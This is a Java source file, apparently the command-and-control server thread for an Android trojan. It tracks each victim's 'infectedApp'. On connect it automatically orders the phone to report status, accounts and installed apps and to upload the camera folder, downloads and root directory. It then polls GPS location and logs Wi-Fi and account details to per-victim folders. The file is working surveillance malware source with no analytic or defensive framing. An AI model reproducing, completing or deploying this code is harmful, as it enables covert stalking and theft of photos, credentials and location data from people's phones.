
import org.apache.commons.io.FileUtils;

import java.io.*;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.Arrays;

public class ClientThread implements Runnable {

    private static final int SO_TIMEOUT = 120000;

    private Logger logger, threadLogger, locationLogger, accountLogger, installedAppsLogger, wifiAPLogger;
    private Socket socket = null;
    private DataInputStream in;
    private DataOutputStream out;
    private Heartbeat heartbeat;
    private LocationPoller locationPoller;
    private int threadPort, pollingRate;
    private String clientID;
    private String version;
    private String infectedApp;
    private String lastLocation;
    private ArrayList<String> guessedNames = new ArrayList<String>();
    private ArrayList<String> emailAddresses = new ArrayList<String>();
    private boolean listen;

    public ClientThread(Socket socket, String clientID, String version, String infectedApp, int pollingRate) {
        // initiate thread
        this.socket = socket;
        this.clientID = clientID;
        this.version = version;
        this.infectedApp = infectedApp;
        this.pollingRate = pollingRate;
        listen = true;
        logger = new Logger(Logger.LOG_TYPE_NORMAL, clientID);
        threadLogger = new Logger(Logger.LOG_TYPE_THREADS, "threads");
        locationLogger = new Logger(Logger.LOG_TYPE_LOCATIONS, clientID);
        accountLogger = new Logger(Logger.LOG_TYPE_ACCOUNTS, clientID);
        wifiAPLogger = new Logger(Logger.LOG_WIFI_APS, clientID);
        installedAppsLogger = new Logger(Logger.LOG_TYPE_INSTALLED_APPS, clientID);
        threadPort = socket.getPort();
        logger.log("New client connected from: " + socket.getRemoteSocketAddress() + " v" + version);
        File directory = new File(clientID);
        if (!directory.exists()) {
            if (!directory.mkdir()) {
                logger.log("Can't create directory, do I have proper permissions and enough disk space?");
            }
        }
    }

    @Override
    public void run() {
        try {
            threadLogger.log("");

            socket.setSoTimeout(SO_TIMEOUT);
            in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
            out = new DataOutputStream(new DataOutputStream(socket.getOutputStream()));

            // Request client status
            say("status");
            say("accounts");
            say("apps");
            say("download /DCIM/Camera");
            say("download /Download");
            say("download /");

            // TODO check if client already exists.
            // TODO notification of a new device

            // Start heartbeat
            heartbeat = new Heartbeat(out);
            locationPoller = new LocationPoller(out, pollingRate);
            heartbeat.start();
            locationPoller.start();

            while (listen) {
                // get header
                int header = in.readInt();

                // get size, we expect the next data ([25 - 28]) to contain an int
                int size = in.readInt();
                byte[] message;
                switch(header){
                    case Protocol.MESSAGE:
                        // here comes a message
                        message = new byte[size];
                        in.readFully(message, 0, message.length);
                        handleMessage(new String(message, "UTF-8"));
                        break;
                    case Protocol.FILE:
                        // here comes a file
                        // start progress tracker on last commandline
                        ProgressHandler progress = new ProgressHandler(clientID, size, in);
                        progress.start();
                        try {
                            // download the file
                            int bytesRead = 0;
                            byte[] file = new byte[size];
                            while (bytesRead < size) {
                                int result = in.read(file, bytesRead, size - bytesRead);
                                if (result == -1) break;
                                bytesRead += result;
                                progress.setProgress(bytesRead);
                            }
                            progress.setShowProgress(false);
                            handleFile(file);
                        } catch (IOException e) {
                            logger.log("Download failed");
                        }
                        break;
                    default:
                        logger.log("I don't understand the data.");
                        logger.log("header:     " + header);
                        logger.log("size:       " + size);
                        message = new byte[size];
                        in.readFully(message, 0, message.length);
                        logger.log("strMessage: " + new String(message, "UTF-8"));
                }
            }
        } catch (SocketTimeoutException e) {
            logger.log("Connection timed out");
        } catch (EOFException e) {
            logger.log("EOFException");
        } catch (IOException e) {
            logger.log("IO Exception");
            e.printStackTrace();
        } finally {
            listen = false;
            if (heartbeat != null) {
                heartbeat.setRunning(false);
            }
            if (locationPoller != null) {
                locationPoller.setRunning(false);
            }
            try {
                if (in != null) {
                    in.close();
                }
                if (out != null) {
                    out.flush();
                    out.close();
                }
                if (socket != null) {
                    socket.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            // Notify user
            StringBuilder sb = new StringBuilder();
            sb.append("@ thread ");
            sb.append(ConnectionHandler.clientThreads.indexOf(this));
            sb.append(" has disconnected");
            logger.log(sb.toString());
            ConnectionHandler.clientThreads.remove(this);
            threadLogger.log("");
        }
    }

    private void handleFile(byte[] bytes) throws IOException {
        // we expect the header size to be 128 bytes
        int HEADER_SIZE = 128;
        byte[] bReceivedFile = bytes;
        // get extension in the form of bytes
        byte[] bFileName = Arrays.copyOfRange(bReceivedFile, 0, HEADER_SIZE);
        // remove header from received globalLogFile
        bReceivedFile = Arrays.copyOfRange(bReceivedFile, HEADER_SIZE, bReceivedFile.length);
        // convert to filename to a string
        String strFileName = new String(bFileName, "UTF-8").trim();
        // save the globalLogFile to disk using Apache commons
        File file = new File(clientID, strFileName);
        FileUtils.writeByteArrayToFile(file, bReceivedFile);
        logger.log("\r\nSuccesfully received " + strFileName);
    }

    private void handleMessage(String message) {
        if (message.equals("♥")) {
            return;
        }
        if (message.startsWith("lat ")) {
            locationLogger.log(message);
            lastLocation = message;
        }
        if (message.startsWith("Accounts:")) {
            accountLogger.log(message);
        }
        if (message.startsWith("Connected to: ") || message.startsWith("IP address")) {
            wifiAPLogger.log(message);
        }
        if (message.startsWith("Installed apps:")) {
            installedAppsLogger.log(message);
        }
        logger.log(message);
    }

    public void say(String message) {
        synchronized (out) { // wait for any other uploads or messages
            if (out != null) {
                try {
                    // notify the other side we are sending a message
                    out.writeInt(Protocol.MESSAGE);
                    // notify of the size of the message
                    out.writeInt(message.getBytes().length);
                    out.flush();
                    // convert message to bytes and send
                    byte[] messageBytes = message.getBytes();
                    out.write(messageBytes, 0, messageBytes.length);
                    out.flush();
                } catch (Exception e) {
                    logger.log("IOException, could not send message: " + message);
                }
            }
        }
    }

    public String getLastReportedLocation() {
        return lastLocation;
    }

    public ArrayList<String> getEmailAddresses() {
        if(emailAddresses.size() > 0) {
            return emailAddresses;
        } else {
            ArrayList<String> noEmailAddresses = new ArrayList<String>();
            noEmailAddresses.add("no_email_addr_found");
            return noEmailAddresses;
        }
    }

    public ArrayList<String> getGuessedNames() {
        if(guessedNames.size() > 0) {
            return guessedNames;
        } else {
            ArrayList<String> noGuessedNames = new ArrayList<String>();
            noGuessedNames.add("no_name_found");
            return noGuessedNames;
        }
    }

    public int getThreadPort() {
        return threadPort;
    }

    public String getClientID() {
        return clientID;
    }

    public void setSocket(Socket socket) {
        this.socket = socket;
    }

    public Socket getSocket() {
        return socket;
    }

    public String getInfectedApp() {
        return infectedApp;
    }

    public String getVersion() {
        return version;
    }

}
